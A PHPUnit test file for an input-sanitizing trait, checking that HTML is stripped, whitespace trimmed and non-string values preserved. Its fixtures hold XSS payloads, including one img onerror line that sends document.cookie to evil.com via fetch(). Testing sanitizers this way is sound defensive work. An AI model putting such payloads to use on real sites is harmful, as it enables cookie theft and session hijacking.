<?php

namespace Tests\Unit;

use App\Traits\SanitizesInput;
use PHPUnit\Framework\TestCase;

class SanitizesInputTest extends TestCase
{
    use SanitizesInput;

    public function test_strips_html_tags_from_strings(): void
    {
        $input = [
            'name' => 'Test <script>alert("XSS")</script>',
            'bio' => 'Bio with <img src=x onerror=alert(1)>',
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('Test alert("XSS")', $result['name']);
        $this->assertEquals('Bio with', $result['bio']);
    }

    public function test_trims_whitespace(): void
    {
        $input = [
            'name' => '  Test Name  ',
            'bio' => "\n\nBio content\t\t",
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('Test Name', $result['name']);
        $this->assertEquals('Bio content', $result['bio']);
    }

    public function test_handles_null_values(): void
    {
        $input = [
            'name' => 'Test',
            'bio' => null,
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('Test', $result['name']);
        $this->assertNull($result['bio']);
    }

    public function test_preserves_numeric_values(): void
    {
        $input = [
            'name' => 'Test',
            'age' => 25,
            'price' => 19.99,
        ];

        $result = $this->sanitizeInput($input);

        $this->assertSame(25, $result['age']);
        $this->assertSame(19.99, $result['price']);
    }

    public function test_preserves_boolean_values(): void
    {
        $input = [
            'is_featured' => true,
            'is_active' => false,
        ];

        $result = $this->sanitizeInput($input);

        $this->assertTrue($result['is_featured']);
        $this->assertFalse($result['is_active']);
    }

    public function test_sanitizes_nested_arrays(): void
    {
        $input = [
            'name' => 'Test',
            'address' => [
                'street' => 'Main St <script>alert(1)</script>',
                'city' => 'New <b>York</b>',
            ],
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('Main St alert(1)', $result['address']['street']);
        $this->assertEquals('New York', $result['address']['city']);
    }

    public function test_excludes_specified_fields_from_sanitization(): void
    {
        $this->excludeFromSanitization = ['password'];

        $input = [
            'email' => 'test@example.com<script>',
            'password' => 'P@ssw0rd<script>alert(1)</script>',
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('test@example.com', $result['email']);
        $this->assertEquals('P@ssw0rd<script>alert(1)</script>', $result['password']);
    }

    public function test_handles_empty_strings(): void
    {
        $input = [
            'name' => '',
            'bio' => '   ',
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('', $result['name']);
        $this->assertEquals('', $result['bio']);
    }

    public function test_removes_multiple_html_tags(): void
    {
        $input = [
            'description' => '<p>Test <strong>content</strong> with <a href="#">link</a></p>',
        ];

        $result = $this->sanitizeInput($input);

        $this->assertEquals('Test content with link', $result['description']);
    }

    public function test_handles_malicious_payloads(): void
    {
        $input = [
            'content' => '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">',
            'title' => '<iframe src="javascript:alert(1)"></iframe>',
            'body' => '<svg onload=alert("XSS")>',
        ];

        $result = $this->sanitizeInput($input);

        $this->assertStringNotContainsString('<img', $result['content']);
        $this->assertStringNotContainsString('<iframe', $result['title']);
        $this->assertStringNotContainsString('<svg', $result['body']);
        $this->assertStringNotContainsString('onerror', $result['content']);
        $this->assertStringNotContainsString('onload', $result['body']);
    }
}
